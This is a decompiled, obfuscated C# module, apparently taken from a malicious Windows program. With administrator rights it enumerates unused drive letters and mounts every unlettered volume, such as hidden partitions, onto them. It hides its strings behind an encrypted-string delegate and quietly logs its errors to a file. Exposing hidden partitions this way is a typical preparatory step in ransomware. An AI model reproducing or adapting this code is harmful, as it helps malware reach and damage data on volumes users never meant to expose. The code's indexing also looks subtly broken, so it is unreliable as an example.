using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace coxZRmDhvSAWo;

public static class XInkCOSArzi
{
	public enum ZirWbahqwpy : uint
	{
		zKcLFbQDvApTjOy,
		mHEVlprVyl,
		woEOuadBAulF,
		WxRDVjJHMCBzdE,
		ObNBbsaQtosyw,
		XfxIGnqMPQQk,
		xzRujZxBwGw
	}

	private sealed class jqlzjdkvtliE
	{
		public uint scWarUUNdVH;

		public uint hEmRQxnnUerJj;

		public char[] WtAngtLRHtrDRk;

		public bool _003CMountVolumes_003Eb__0(string string_0)
		{
			return !GetVolumePathNamesForVolumeNameW(string_0, WtAngtLRHtrDRk, hEmRQxnnUerJj, ref scWarUUNdVH) || WtAngtLRHtrDRk.Length != 3;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	public static extern ZirWbahqwpy GetDriveType([MarshalAs(UnmanagedType.LPStr)] string CTTtXmpsrIK);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetVolumePathNamesForVolumeNameW(string hxhPZgUKLouKjs, char[] XpfVpdSimTUy, uint nGpgEMEvpPzIsapp, ref uint pUtumUjMNwierlI);

	[DllImport("kernel32.dll")]
	internal static extern bool SetVolumeMountPoint(string string_0, string string_1);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern int FindFirstVolume(StringBuilder stringBuilder_0, int int_0);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern bool FindNextVolume(int int_0, StringBuilder stringBuilder_0, int int_1);

	public static List<string> hUtFudLgIyBnV()
	{
		StringBuilder stringBuilder = new StringBuilder(1024);
		List<string> list = new List<string>();
		int int_ = FindFirstVolume(stringBuilder, 1024);
		do
		{
			list.Add(stringBuilder.ToString());
			Console.WriteLine(stringBuilder.ToString());
		}
		while (FindNextVolume(int_, stringBuilder, 1024));
		return list;
	}

	public static void TRPsSqqynF()
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			return;
		}
		try
		{
			jqlzjdkvtliE CS_0024_003C_003E8__locals0 = new jqlzjdkvtliE();
			string[] array = new string[26]
			{
				getString_0(107362877),
				getString_0(107362904),
				getString_0(107362899),
				getString_0(107362894),
				getString_0(107362345),
				getString_0(107362340),
				getString_0(107362335),
				getString_0(107362330),
				getString_0(107362357),
				getString_0(107362352),
				getString_0(107362347),
				getString_0(107362310),
				getString_0(107362305),
				getString_0(107362300),
				getString_0(107362327),
				getString_0(107362322),
				getString_0(107362317),
				getString_0(107362280),
				getString_0(107362275),
				getString_0(107362270),
				getString_0(107362297),
				getString_0(107362292),
				getString_0(107362287),
				getString_0(107362282),
				getString_0(107362245),
				getString_0(107362240)
			};
			string[] array2 = new string[array.Length];
			int num = 0;
			string[] array3 = array;
			foreach (string text in array3)
			{
				if (GetDriveType(text) == ZirWbahqwpy.mHEVlprVyl)
				{
					array2[num++] = text;
				}
			}
			List<string> source = hUtFudLgIyBnV();
			CS_0024_003C_003E8__locals0.scWarUUNdVH = 0u;
			CS_0024_003C_003E8__locals0.hEmRQxnnUerJj = 120u;
			CS_0024_003C_003E8__locals0.WtAngtLRHtrDRk = new char[260];
			foreach (string item in source.Where((string string_0) => !GetVolumePathNamesForVolumeNameW(string_0, CS_0024_003C_003E8__locals0.WtAngtLRHtrDRk, CS_0024_003C_003E8__locals0.hEmRQxnnUerJj, ref CS_0024_003C_003E8__locals0.scWarUUNdVH) || CS_0024_003C_003E8__locals0.WtAngtLRHtrDRk.Length != 3))
			{
				SetVolumeMountPoint(array2[num--], item);
				if (aSOyqwTwiifNb.fgLeGcGjPkpRXH)
				{
					try
					{
						Console.WriteLine(getString_0(107362235), array2[num--]);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (aSOyqwTwiifNb.CCDyMIHlAe)
			{
				try
				{
					File.AppendAllText(aSOyqwTwiifNb.dtHHyJMWMTcTg, getString_0(107362210) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static XInkCOSArzi()
	{
		Strings.CreateGetStringDelegate(typeof(XInkCOSArzi));
	}
}
